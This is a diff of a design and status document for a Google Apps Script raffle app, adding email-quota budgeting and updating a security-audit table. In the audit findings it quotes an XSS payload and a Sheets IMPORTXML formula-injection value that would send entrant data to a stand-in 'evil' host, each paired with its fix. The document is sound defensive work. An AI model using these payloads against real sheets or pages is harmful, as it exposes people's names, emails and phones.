@@ -34,7 +34,7 @@ untouched — nothing public goes anywhere near its Anthropic key or script toke
 
 ## Deployment status
 
-**Live as version @46, deployed 2026-09-17 by `info@tsg.homes`.**
+**Live as version @63, deployed 2026-09-17 by `info@tsg.homes`.**
 
 All nine project files pushed and then verified byte-for-byte by re-pulling the
 live project — including `Code.js`, `OpenHouseForm.html` and `ClientIntake.html`,
@@ -162,7 +162,18 @@ and a missing key both return an identical "Not found", so neither can be probed
   adds referrals rather than a second own entry.
 - **Every 10 people entered** — Durand gets a note with the people, ticket and
   pending-referral counts. During the party an hourly digest takes over instead,
-  so he is not double-notified while standing in a street.
+  so he is not double-notified while standing in a street. The digest also prints
+  the email budget: recipients left today, the burn rate, and whether it lasts.
+- **Email budget, day of** — the account has 1,500 recipients a day, shared with
+  the Open House form, and every bcc copy counts (a code is 1, an invite is 3, a
+  full referral chain about 14). Every send between 3:00 and 6:15 records the
+  remaining quota; if the faster of the party-long and last-hour rates says it
+  runs out before entries close, **one** email goes to Durand and Ryan with the
+  rate and the projected time (`raffleWatchMailQuota_`). Independently, sends
+  refuse once fewer than 40 recipients would remain (`RAFFLE_MAIL_RESERVE`), so
+  the result, the winner email and alerts always have budget; the entrant is
+  told to grab someone from TSG and the refusal alerts once. Each QA suite run
+  costs about 60 recipients — run it once, in the morning.
 - **5:00 PM Saturday** — every referral who has not replied gets one last-chance
   email, and every entrant still waiting on somebody gets one nudge to text them.
   All of them go out in a single batch, deliberately: one wave, 75 minutes of
@@ -435,7 +446,7 @@ was already live, and it found four things that were genuinely wrong:
 |---|---|---|
 | **Stored XSS on the admin pages** | The status and draw pages built HTML by concatenation from the winner's name, phone and email — all public text boxes. `<img src=x onerror=…> Smith` would have executed in Durand's browser the moment he opened the page to read the winner, i.e. at 6:15 in front of the crowd. | `raffleEsc_` at all 8 render sinks. Escaping stays at the **sink**, never at ingest — the host project removed ingest-escaping on purpose because it was mangling `O'Brien` on the way into FUB. |
 | **Sheets formula injection** | A name of `=IMPORTXML("https://evil/?d="&C2,"//a")` is a live formula the moment the entries sheet is opened, and can ship every entrant's name, email and phone to a third party. The junk-phone filter does not catch it: that reads digits, and a formula string can carry ten valid ones. | `raffleSafeCell_` on every entrant-supplied cell. |
-| **The endpoint was a free mailer** | Step 1 emails a code to any address posted. The shared 15/minute cap bounds the rate but sustains 21,600/day, so the 1,500/day Workspace quota dies in under two hours — taking verification codes, the Open House form's email and `sendErrorAlert` down with it, silently. | `raffleCheckCodeSendQuota_`: 3 codes per address per hour, 500 per rolling 6 hours, with an alert when the ceiling is hit. |
+| **The endpoint was a free mailer** | Step 1 emails a code to any address posted. The shared 15/minute cap bounds the rate but sustains 21,600/day, so the 1,500/day Workspace quota dies in under two hours — taking verification codes, the Open House form's email and `sendErrorAlert` down with it, silently. | `raffleCheckCodeSendQuota_`: 3 codes per address per hour, 750 **recipients** (not messages — bcc copies count) per 6-hour bucket, with an alert when the ceiling is hit; and a hard reserve of 40 against the real daily quota, read from `MailApp.getRemainingDailyQuota()` on every guarded send. |
 | **Gmail alias stuffing** | `sam.vance@`, `samvance@` and `sam.vance+party@gmail.com` are one inbox and were three entries — stuffing with no second inbox and no second phone. | `raffleEmailKey_` collapses dots (Google only) and `+tags` (major consumer hosts). |
 
 One hardening change came out of it that was not a bug: a **live draw before
